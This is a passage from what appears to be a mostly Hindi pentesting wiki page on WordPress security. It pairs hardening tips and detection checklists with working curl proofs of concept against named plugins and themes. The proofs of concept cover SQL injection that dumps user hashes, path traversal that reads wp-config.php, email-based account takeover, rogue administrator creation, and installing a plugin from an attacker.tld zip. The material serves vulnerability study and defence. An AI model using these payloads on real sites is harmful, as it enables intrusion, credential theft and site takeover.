- पहले unauth paths का परीक्षण करें (AJAX `nopriv`, REST with permissive `permission_callback`, public shortcodes). Default payloads अक्सर बिना obfuscation के सफल हो जाते हैं।
- आम उच्च-प्रभाव मामले: privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

Defensive notes

- Generic WAF signatures पर plugin CVEs की सुरक्षा के लिए भरोसा न करें। application-layer, vulnerability-specific virtual patches लागू करें या जल्दी अपडेट करें।
- कोड में negative regex filters की तुलना में positive-security checks (capabilities, nonces, strict input validation) को प्राथमिकता दें।

## WordPress Protection

### नियमित अपडेट

सुनिश्चित करें कि WordPress, plugins, और themes अपडेटेड हैं। साथ ही पुष्टि करें कि automated updating wp-config.php में सक्षम है:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
इसके अलावा, **केवल भरोसेमंद WordPress plugins और themes ही इंस्टॉल करें।**

### सुरक्षा प्लगइन्स

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **अन्य सुझाव**

- डिफॉल्ट **admin** उपयोगकर्ता को हटाएँ
- **मजबूत पासवर्ड** और **2FA** का उपयोग करें
- समय-समय पर उपयोगकर्ताओं की **अनुमतियाँ** की **समीक्षा** करें
- Brute Force हमलों को रोकने के लिए **लॉगिन प्रयासों को सीमित करें**
- **`wp-admin.php`** फाइल का नाम बदलें और केवल आंतरिक रूप से या कुछ निश्चित IP पतों से ही एक्सेस की अनुमति दें।

### Unauthenticated SQL Injection via insufficient validation (WP Job Portal <= 2.3.2)

WP Job Portal recruitment plugin ने एक **savecategory** टास्क उजागर किया जो अंततः `modules/category/model.php::validateFormData()` के अंदर निम्नलिखित असुरक्षित कोड को निष्पादित करता है:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ✗
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Issues introduced by this snippet:

1. **Unsanitised user input** – `parentid` सीधे HTTP request से आता है।
2. **String concatenation inside the WHERE clause** – कोई `is_numeric()` / `esc_sql()` / prepared statement नहीं।
3. **Unauthenticated reachability** – हालांकि action `admin-post.php` के माध्यम से execute होता है, पर मौजूद唯一 जाँच एक **CSRF nonce** (`wp_verify_nonce()`) है, जिसे कोई भी विज़िटर public पेज से प्राप्त कर सकता है जो shortcode `[wpjobportal_my_resumes]` एम्बेड करता है।

#### Exploitation

1. एक ताज़ा nonce प्राप्त करें:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. `parentid` का दुरुपयोग करके arbitrary SQL इंजेक्ट करें:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
Response इंजेक्ट किए गए क्वेरी का परिणाम उजागर करता है या डेटाबेस बदल देता है, जिससे SQLi प्रमाणित होता है।


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

एक अन्य टास्क, **downloadcustomfile**, विज़िटर को path traversal के माध्यम से डिस्क से **किसी भी फ़ाइल** डाउनलोड करने की अनुमति देता था। कमजोर sink स्थित है `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` हमलावर द्वारा नियंत्रित है और **सैनिटाइज़ेशन के बिना** संयोजित किया जाता है।  फिर से, एकमात्र बाधा **CSRF nonce** है जिसे resume पृष्ठ से प्राप्त किया जा सकता है।

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
The server responds with the contents of `wp-config.php`, leaking DB credentials and auth keys.

## अप्रमाणीकरण किए बिना account takeover via Social Login AJAX fallback (Jobmonster Theme <= 4.7.9)

कई themes/plugins "social login" helpers ship करते हैं जो admin-ajax.php के माध्यम से एक्सपोज़ होते हैं। अगर एक unauthenticated AJAX action (wp_ajax_nopriv_...) client-supplied identifiers पर भरोसा करता है जब provider data अनुपस्थित हो और फिर wp_set_auth_cookie() को कॉल करता है, तो यह एक पूरा authentication bypass बन जाता है।

Typical flawed pattern (simplified)
```php
public function check_login() {
// ... request parsing ...
switch ($_POST['using']) {
case 'fb':     /* set $user_email from verified Facebook token */ break;
case 'google': /* set $user_email from verified Google token   */ break;
// other providers ...
default: /* unsupported/missing provider – execution continues */ break;
}

// FALLBACK: trust POSTed "id" as email if provider data missing
$user_email = !empty($user_email)
? $user_email
: (!empty($_POST['id']) ? esc_attr($_POST['id']) : '');

if (empty($user_email)) {
wp_send_json(['status' => 'not_user']);
}

$user = get_user_by('email', $user_email);
if ($user) {
wp_set_auth_cookie($user->ID, true); // 🔥 logs requester in as that user
wp_send_json(['status' => 'success', 'message' => 'Login successfully.']);
}
wp_send_json(['status' => 'not_user']);
}
// add_action('wp_ajax_nopriv_<social_login_action>', [$this, 'check_login']);
```
यह शोषणीय क्यों है

- admin-ajax.php के माध्यम से unauthenticated पहुँच (wp_ajax_nopriv_… action)।
- state change से पहले कोई nonce/capability चेक नहीं है।
- OAuth/OpenID provider सत्यापन अनुपस्थित है; default branch attacker इनपुट स्वीकार कर लेता है।
- get_user_by('email', $_POST['id']) के बाद wp_set_auth_cookie($uid) कॉल करने से requester को किसी भी मौजूद email address के रूप में प्रमाणित कर देता है।

Exploitation (unauthenticated)

- पूर्वापेक्षाएँ: attacker /wp-admin/admin-ajax.php तक पहुँच सकता है और किसी वैध उपयोगकर्ता ईमेल को जानता/अनुमान लगा सकता है।
- provider को एक unsupported value पर सेट करें (या इसे छोड़ दें) ताकि default branch पर जाएँ और id=<victim_email> पास करें।
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Content-Type: application/x-www-form-urlencoded

action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com
```

```bash
curl -i -s -X POST https://victim.tld/wp-admin/admin-ajax.php \
-d "action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com"
```
Expected success indicators

- HTTP 200 with JSON body like {"status":"success","message":"Login successfully."}.
- Set-Cookie: wordpress_logged_in_* for the victim user; subsequent requests are authenticated.

Finding the action name

- Inspect the theme/plugin for add_action('wp_ajax_nopriv_...', '...') registrations in social login code (e.g., framework/add-ons/social-login/class-social-login.php).
- Grep for wp_set_auth_cookie(), get_user_by('email', ...) inside AJAX handlers.

Detection checklist

- Web logs showing unauthenticated POSTs to /wp-admin/admin-ajax.php with the social-login action and id=<email>.
- 200 responses with the success JSON immediately preceding authenticated traffic from the same IP/User-Agent.

Hardening

- क्लाइंट इनपुट से पहचान न निकालें। केवल validated provider token/ID से उत्पन्न emails/IDs स्वीकार करें।
- Require CSRF nonces और capability checks लगाएँ भले ही वे login helpers हों; wp_ajax_nopriv_ को केवल तभी रजिस्टर करें जब बिल्कुल ज़रूरी हो।
- OAuth/OIDC responses को server-side validate और verify करें; missing/invalid providers को reject करें (POST id पर fallback न करें)।
- तब तक social login अस्थायी रूप से disable करने या edge पर virtual patching (vulnerable action को block करना) पर विचार करें जब तक fix न हो जाए।

Patched behaviour (Jobmonster 4.8.0)

- Removed the insecure fallback from $_POST['id']; $user_email must originate from verified provider branches in switch($_POST['using']).

## Unauthenticated privilege escalation via REST token/key minting on predictable identity (OttoKit/SureTriggers ≤ 1.0.82)

कुछ plugins ऐसे REST endpoints एक्सपोज़ करते हैं जो caller की capabilities की जांच किए बिना reusable “connection keys” या tokens मिंट कर देते हैं। अगर route केवल किसी guessable attribute (जैसे username) पर authenticate करता है और key को user/session के साथ capability checks के साथ bind नहीं करता, तो कोई भी unauthenticated attacker एक key मिंट कर सकता है और privileged actions (admin account creation, plugin actions → RCE) को invoke कर सकता है।

- Vulnerable route (example): sure-triggers/v1/connection/create-wp-connection
- Flaw: accepts a username, issues a connection key without current_user_can() or a strict permission_callback
- Impact: full takeover by chaining the minted key to internal privileged actions

PoC – mint a connection key and use it
```bash
# 1) Obtain key (unauthenticated). Exact payload varies per plugin
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/connection/create-wp-connection" \
-H 'Content-Type: application/json' \
--data '{"username":"admin"}'
# → {"key":"<conn_key>", ...}

# 2) Call privileged plugin action using the minted key (namespace/route vary per plugin)
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/users" \
-H 'Content-Type: application/json' \
-H 'X-Connection-Key: <conn_key>' \
--data '{"username":"pwn","email":"p@t.ld","password":"p@ss","role":"administrator"}'
```
क्यों यह शोषण योग्य है
- संवेदनशील REST route केवल कम-एंट्रॉपी पहचान प्रमाण (username) पर निर्भर है या permission_callback गायब है
- कोई capability enforcement नहीं; minted key को सार्वभौमिक bypass के रूप में स्वीकार कर लिया जाता है

पता लगाने की चेकलिस्ट
- plugin कोड में register_rest_route(..., [ 'permission_callback' => '__return_true' ]) के लिए grep करें
- कोई भी route जो request-supplied identity (username/email) के आधार पर tokens/keys जारी करता है, बिना किसी authenticated user या capability से जोड़े
- उन subsequent routes को देखें जो server-side capability checks के बिना minted token/key को स्वीकार करते हैं

हार्डनिंग
- किसी भी privileged REST route के लिए: एक permission_callback आवश्यक रखें जो required capability के लिए current_user_can() को लागू करे
- client-supplied identity से long-lived keys mint न करें; यदि आवश्यक हो तो authentication के बाद short-lived, user-bound tokens जारी करें और उपयोग पर capabilities फिर से जाँचें
- कॉलर के user context को validate करें (wp_set_current_user अकेले पर्याप्त नहीं है) और उन requests को reject करें जहाँ !is_user_logged_in() || !current_user_can(<cap>)

---

## Nonce gate के गलत उपयोग → बिना प्रमाणीकरण के मनमाना plugin इंस्टॉलेशन (FunnelKit Automations ≤ 3.5.3)

Nonces CSRF को रोकते हैं, authorization नहीं। अगर कोड nonce पास को green light मानकर privileged operations (e.g., install/activate plugins) के लिए capability checks छोड़ देता है, तो बिना प्रमाणीकरण वाले attackers एक कमजोर nonce शर्त पूरी कर के backdoored या vulnerable plugin इंस्टॉल करके RCE हासिल कर सकते हैं।

- Vulnerable path: plugin/install_and_activate
- Flaw: weak nonce hash check; nonce “passes” होने पर current_user_can('install_plugins'|'activate_plugins') लागू नहीं होता
- Impact: arbitrary plugin install/activation के माध्यम से पूर्ण समझौता

PoC (shape depends on plugin; illustrative only)
```bash
curl -i -s -X POST https://victim.tld/wp-json/<fk-namespace>/plugin/install_and_activate \
-H 'Content-Type: application/json' \
--data '{"_nonce":"<weak-pass>","slug":"hello-dolly","source":"https://attacker.tld/mal.zip"}'
```
पता लगाने की चेकलिस्ट
- REST/AJAX हैंडलर जो plugins/themes को केवल wp_verify_nonce()/check_admin_referer() के साथ संशोधित करते हैं और capability check नहीं करते
- कोई भी कोड पाथ जो nonce validation के बाद $skip_caps = true सेट करता है

हार्डनिंग
- Nonces को केवल CSRF tokens के रूप में ही मानें; nonce की स्थिति के बावजूद capability checks लागू करें
- installer code तक पहुँचने से पहले current_user_can('install_plugins') और current_user_can('activate_plugins') आवश्यक करें
- अप्रमाणीकृत पहुँच को अस्वीकार करें; privileged flows के लिए nopriv AJAX actions को एक्सपोज़ करने से बचें

---

## अप्रमाणीकृत SQLi depicter-* actions में s (search) parameter के माध्यम से (Depicter Slider ≤ 3.6.1)

कई depicter-* actions ने s (search) parameter को लिया और उसे parameterization के बिना SQL queries में concatenated किया।

- Parameter: s (search)
- Flaw: WHERE/LIKE clauses में सीधे string concatenation; कोई prepared statements/sanitization नहीं
- Impact: database exfiltration (users, hashes), lateral movement

PoC
```bash
# Replace action with the affected depicter-* handler on the target
curl -G "https://victim.tld/wp-admin/admin-ajax.php" \
--data-urlencode 'action=depicter_search' \
--data-urlencode "s=' UNION SELECT user_login,user_pass FROM wp_users-- -"
```
डिटेक्शन चेकलिस्ट
- depicter-* action handlers के लिए Grep करें और SQL में $_GET['s'] या $_POST['s'] का सीधे उपयोग देखें
- $wpdb->get_results()/query() को पास किए गए कस्टम क्वेरीज़ की समीक्षा करें जो s को जोड़ती हैं

हार्डनिंग
- हमेशा $wpdb->prepare() या wpdb placeholders का उपयोग करें; सर्वर-साइड पर अनपेक्षित metacharacters को अस्वीकार करें
- s के लिए एक सख्त allowlist जोड़ें और अपेक्षित charset/length के अनुसार सामान्यीकृत करें

---

## बिना प्रमाणिकरण Local File Inclusion के माध्यम से अमान्यीकृत template/file path (Kubio AI Page Builder ≤ 2.5.1)

Normalization/containment के बिना template पैरामीटर में attacker-controlled paths को स्वीकार करने से arbitrary local files पढ़ने की अनुमति मिलती है, और कभी-कभी code execution भी हो सकता है अगर includable PHP/log files runtime में शामिल कर दिए जाएँ।

- Parameter: __kubio-site-edit-iframe-classic-template
- कमज़ोरी: कोई normalization/allowlisting नहीं; traversal की अनुमति है
- प्रभाव: गुप्त जानकारी का खुलासा (wp-config.php), विशिष्ट वातावरणों में संभावित RCE (log poisoning, includable PHP)

PoC – wp-config.php पढ़ें
```bash
curl -i "https://victim.tld/?__kubio-site-edit-iframe-classic-template=../../../../wp-config.php"
```
पता लगाने की चेकलिस्ट
- कोई भी handler जो अनुरोध पाथ्स को include()/require()/read sinks में जोड़ता है बिना realpath() containment के
- traversal patterns (../) की तलाश करें जो intended templates directory के बाहर पहुँच रहे हों

कठोरकरण
- Enforce allowlisted templates; resolve with realpath() and require str_starts_with(realpath(file), realpath(allowed_base))
- इनपुट को Normalize करें; traversal sequences और absolute paths को reject करें; sanitize_file_name() का उपयोग केवल filenames के लिए करें (not full paths)


## संदर्भ

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset – delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments ≤ 5.6.1 – Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation – Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)
- [Unauthenticated Broken Authentication Vulnerability in WordPress Jobmonster Theme](https://patchstack.com/articles/unauthenticated-broken-authentication-vulnerability-in-wordpress-jobmonster-theme/)
- [Q3 2025’s most exploited WordPress vulnerabilities and how RapidMitigate blocked them](https://patchstack.com/articles/q3-2025s-most-exploited-wordpress-vulnerabilities-and-how-patchstacks-rapidmitigate-blocked-them/)
- [OttoKit (SureTriggers) ≤ 1.0.82 – Privilege Escalation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/suretriggers/vulnerability/wordpress-suretriggers-1-0-82-privilege-escalation-vulnerability)
- [FunnelKit Automations ≤ 3.5.3 – Unauthenticated arbitrary plugin installation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/wp-marketing-automations/vulnerability/wordpress-recover-woocommerce-cart-abandonment-newsletter-email-marketing-marketing-automation-by-funnelkit-plugin-3-5-3-missing-authorization-to-unauthenticated-arbitrary-plugin-installation-vulnerability)
- [Depicter Slider ≤ 3.6.1 – Unauthenticated SQLi via s parameter (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/depicter/vulnerability/wordpress-depicter-slider-plugin-3-6-1-unauthenticated-sql-injection-via-s-parameter-vulnerability)
- [Kubio AI Page Builder ≤ 2.5.1 – Unauthenticated LFI (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/kubio/vulnerability/wordpress-kubio-ai-page-builder-plugin-2-5-1-unauthenticated-local-file-inclusion-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
